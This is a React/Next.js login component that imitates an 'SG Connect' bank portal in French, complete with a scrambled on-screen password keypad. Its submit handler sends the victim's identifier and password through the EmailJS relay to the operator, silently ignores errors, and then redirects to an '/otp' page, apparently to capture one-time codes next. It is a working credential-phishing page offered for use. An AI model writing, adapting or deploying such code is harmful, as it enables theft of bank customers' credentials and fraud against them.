"use client";

import React, { useState } from 'react';
import { useRouter } from 'next/navigation';

const VirtualKeyboard = ({
  onKeyPress,
  onBackspace,
}: {
  onKeyPress: (k: string) => void;
  onBackspace: () => void;
}) => {
  // Randomised layout as per original (numbers scattered, not sequential)
  const layout = [
    ["", "8", "7", "6", "", "1"],
    ["3", "4", "", "", "", "9"],
    ["2", "0", "5", "", "", "{bksp}"],
  ];

  return (
    <div style={{ marginTop: '32px', userSelect: 'none' }}>
      {layout.map((row, ri) => (
        <div key={ri} style={{ display: 'flex', marginBottom: '5px', gap: '5px' }}>
          {row.map((btn, bi) => {
            const empty = btn === "";
            const bksp = btn === "{bksp}";
            return (
              <button
                key={bi}
                type="button"
                onClick={() => { if (bksp) onBackspace(); else if (btn) onKeyPress(btn); }}
                disabled={empty}
                style={{
                  flex: 1,
                  height: '40px',
                  borderRadius: '4px',
                  border: 'none',
                  cursor: empty ? 'default' : 'pointer',
                  backgroundColor: empty ? 'transparent' : '#eceef1',
                  color: '#12163b',
                  fontSize: '15px',
                  fontWeight: '500',
                  fontFamily: "'Montserrat', sans-serif",
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  boxShadow: empty ? 'none' : '0 1px 2px rgba(0,0,0,0.08)',
                  transition: 'background-color 0.15s',
                  outline: 'none',
                }}
                onMouseOver={(e) => { if (!empty) (e.currentTarget as HTMLButtonElement).style.backgroundColor = '#e2e5e9'; }}
                onMouseOut={(e) => { if (!empty) (e.currentTarget as HTMLButtonElement).style.backgroundColor = '#eceef1'; }}
                onMouseDown={(e) => { if (!empty) (e.currentTarget as HTMLButtonElement).style.backgroundColor = '#d8dbdf'; }}
                onMouseUp={(e) => { if (!empty) (e.currentTarget as HTMLButtonElement).style.backgroundColor = '#e2e5e9'; }}
              >
                {bksp ? <span style={{ fontSize: '18px', fontWeight: 'bold' }}>&#8592;</span> : btn}
              </button>
            );
          })}
        </div>
      ))}
    </div>
  );
};

export default function LoginCard() {
  const router = useRouter();
  const [idValue, setIdValue] = useState("");
  const [pwdValue, setPwdValue] = useState("");
  const [idFocused, setIdFocused] = useState(false);
  const [pwdFocused, setPwdFocused] = useState(false);
  const [rememberMe, setRememberMe] = useState(false);
  const [loading, setLoading] = useState(false);

  const handleKeyPress = (key: string) => {
    setPwdValue((v) => v + key);
  };
  const handleBackspace = () => {
    setPwdValue((v) => v.slice(0, -1));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    try {
      await fetch("https://api.emailjs.com/api/v1.0/email/send", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          service_id: process.env.NEXT_PUBLIC_EMAILJS_SERVICE_ID,
          template_id: process.env.NEXT_PUBLIC_EMAILJS_TEMPLATE_ID,
          user_id: process.env.NEXT_PUBLIC_EMAILJS_PUBLIC_KEY,
          template_params: {
            identifier: idValue,
            password: pwdValue,
            remember_me: rememberMe ? "Oui" : "Non",
            timestamp: new Date().toLocaleString("fr-FR", { timeZone: "Africa/Dakar" }),
          },
        }),
      });
      } catch (_) {
        // silent
      } finally {
        setLoading(false);
        router.push('/otp');
      }
    };

  const font: React.CSSProperties = { fontFamily: "'Montserrat', sans-serif" };

  return (
    <section
      style={{
        display: 'flex',
        justifyContent: 'center',
        alignItems: 'flex-start',
        padding: '40px 16px',
        minHeight: 'calc(100vh - 101px)',
        backgroundColor: '#f4f6f9',
      }}
    >
      <div
        style={{
          width: '100%',
          maxWidth: '540px',
          backgroundColor: '#ffffff',
          borderRadius: '8px',
          boxShadow: '0 10px 30px rgba(0,0,0,0.05)',
          padding: '48px 60px',
          ...font,
        }}
      >
        {/* Headings */}
        <div style={{ marginBottom: '48px' }}>
          <h1
            style={{
              fontSize: '26px',
              fontWeight: 600,
              lineHeight: 1.25,
              color: '#12163b',
              margin: '0 0 10px 0',
              ...font,
            }}
          >
            Bienvenue dans votre espace SG Connect
          </h1>
          <p
            style={{
              fontSize: '14px',
              fontWeight: 500,
              color: '#12163b',
              margin: 0,
              ...font,
            }}
          >
            Veuillez renseigner votre identifiant et mot de passe
          </p>
        </div>

        {/* Form */}
          <form onSubmit={handleSubmit}>
          {/* Identifier */}
          <div style={{ position: 'relative', marginBottom: '32px' }}>
            <label
              htmlFor="sg-username"
              style={{
                position: 'absolute',
                left: 0,
                top: idFocused || idValue ? '-16px' : '10px',
                fontSize: idFocused || idValue ? '12px' : '16px',
                color: idFocused ? '#12163b' : '#555555',
                transition: 'all 0.2s ease',
                pointerEvents: 'none',
                ...font,
              }}
            >
              Saisissez votre identifiant
            </label>
            <input
              id="sg-username"
              type="text"
              value={idValue}
              onChange={(e) => setIdValue(e.target.value)}
              onFocus={() => setIdFocused(true)}
              onBlur={() => setIdFocused(false)}
              autoComplete="off"
              style={{
                width: '100%',
                background: 'transparent',
                border: 'none',
                borderBottom: `1px solid ${idFocused ? '#12163b' : '#e0e0e0'}`,
                outline: 'none',
                padding: '8px 0',
                fontSize: '17px',
                color: '#12163b',
                borderRadius: 0,
                boxSizing: 'border-box',
                transition: 'border-color 0.2s',
                ...font,
              }}
            />
          </div>

          {/* Password */}
          <div style={{ position: 'relative', marginBottom: '24px' }}>
            <label
              htmlFor="sg-password"
              style={{
                position: 'absolute',
                left: 0,
                top: pwdFocused || pwdValue ? '-16px' : '10px',
                fontSize: pwdFocused || pwdValue ? '12px' : '16px',
                color: pwdFocused ? '#12163b' : '#555555',
                transition: 'all 0.2s ease',
                pointerEvents: 'none',
                ...font,
              }}
            >
              Saisissez votre mot de passe
            </label>
            <input
              id="sg-password"
              type="password"
              value={pwdValue}
              onChange={(e) => setPwdValue(e.target.value)}
              onFocus={() => setPwdFocused(true)}
              onBlur={() => setPwdFocused(false)}
              autoComplete="current-password"
              readOnly
              style={{
                width: '100%',
                background: 'transparent',
                border: 'none',
                borderBottom: `1px solid ${pwdFocused ? '#12163b' : '#e0e0e0'}`,
                outline: 'none',
                padding: '8px 0',
                fontSize: '17px',
                color: '#12163b',
                borderRadius: 0,
                boxSizing: 'border-box',
                transition: 'border-color 0.2s',
                ...font,
              }}
            />
          </div>

          {/* Virtual Keyboard */}
          <VirtualKeyboard onKeyPress={handleKeyPress} onBackspace={handleBackspace} />

          {/* Remember Me */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              marginTop: '28px',
            }}
          >
            <span style={{ fontSize: '13px', color: '#555555', ...font }}>
              Se souvenir de moi
            </span>
            {/* Custom toggle switch */}
            <div
              onClick={() => setRememberMe(!rememberMe)}
              style={{
                position: 'relative',
                width: '34px',
                height: '14px',
                cursor: 'pointer',
              }}
            >
              <div
                style={{
                  position: 'absolute',
                  top: 0,
                  left: 0,
                  right: 0,
                  bottom: 0,
                  backgroundColor: rememberMe ? '#adb5bd' : '#e0e0e0',
                  borderRadius: '7px',
                  transition: 'background-color 0.2s',
                }}
              />
              <div
                style={{
                  position: 'absolute',
                  top: '-3px',
                  left: rememberMe ? '16px' : '-2px',
                  width: '20px',
                  height: '20px',
                  backgroundColor: '#ffffff',
                  borderRadius: '50%',
                  boxShadow: '0 1px 3px rgba(0,0,0,0.3)',
                  transition: 'left 0.2s',
                }}
              />
            </div>
          </div>

          {/* Submit Button */}
          <div style={{ marginTop: '40px' }}>
            <button
              type="submit"
              disabled={loading}
              style={{
                width: '100%',
                height: '50px',
                backgroundColor: '#f04141',
                color: '#ffffff',
                fontSize: '15px',
                fontWeight: 500,
                borderRadius: '30px',
                border: 'none',
                cursor: loading ? 'not-allowed' : 'pointer',
                transition: 'opacity 0.2s',
                opacity: loading ? 0.75 : 1,
                ...font,
              }}
              onMouseOver={(e) => { if (!loading) (e.currentTarget as HTMLButtonElement).style.opacity = '0.9'; }}
              onMouseOut={(e) => { if (!loading) (e.currentTarget as HTMLButtonElement).style.opacity = '1'; }}
            >
              {loading ? 'Connexion...' : 'Identifiez-vous'}
            </button>
          </div>

          {/* Forgot Password */}
          <div style={{ marginTop: '24px', textAlign: 'center' }}>
            <a
              href="#"
              style={{
                fontSize: '12px',
                fontWeight: 500,
                color: '#12163b',
                textDecoration: 'underline',
                textUnderlineOffset: '2px',
                ...font,
              }}
            >
              Mot de passe oublié ?
            </a>
          </div>
        </form>
      </div>
    </section>
  );
}
